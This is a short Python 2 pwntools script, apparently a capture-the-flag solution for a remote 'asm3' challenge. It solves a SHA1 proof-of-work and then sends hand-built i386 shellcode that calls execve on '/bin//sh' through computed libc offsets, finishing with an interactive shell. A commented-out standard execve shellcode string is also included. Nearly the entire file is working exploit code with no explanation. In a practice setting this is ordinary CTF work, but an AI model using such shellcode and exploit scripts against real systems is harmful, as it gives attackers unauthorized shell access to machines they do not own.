from pwn import *
import hashlib

r = remote ("asm3.eatpwnnosleep.com", 1234)

r.recvuntil ("starts with ")
sha1_cond = r.recvuntil (" and which").split (" ")[0]
print "sha1 condition = "  + (sha1_cond)

i = 0x0
sha1_test = ""
while True:
  sha1_test = hashlib.sha1 ("{}{}".format(sha1_cond, i)).hexdigest()
  if sha1_test[:7] == "0000000":
    print "DONE!"
    break

  i += 1


r.sendline (sha1_cond + str(i))

context.arch = 'i386'
context.os = 'linux'

#offset = 0xf7e06700 - 0xf7fd9000
offset = 0xf7f49e00 - 0xf7e07000
offset = 0xf7e07000 - 0xf7e06700 + 0x3a940 
offset = 0xf7e09c87 - 0xf7e06700 
print hex(offset)
sc = ""
#sc += asm("mov gs:0x1, edx")
sc += asm("mov esp, dword ptr gs:[ebx+0x0];")
sc += asm("mov eax, esp")
sc += asm("add ax, 0x3587")
sc += asm("mov edi, eax")
sc += asm("xor eax, eax")
sc += asm("mov al, 11")
sc += asm("push 0x68732f2f")
sc += asm("push 0x6e69622f")
sc += asm("mov ebx, esp")
sc += asm("call edi")
print len(sc)
#sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80".rjust(30, "\x90")
r.sendline (sc.ljust(30, "\x90"))

r.interactive ()



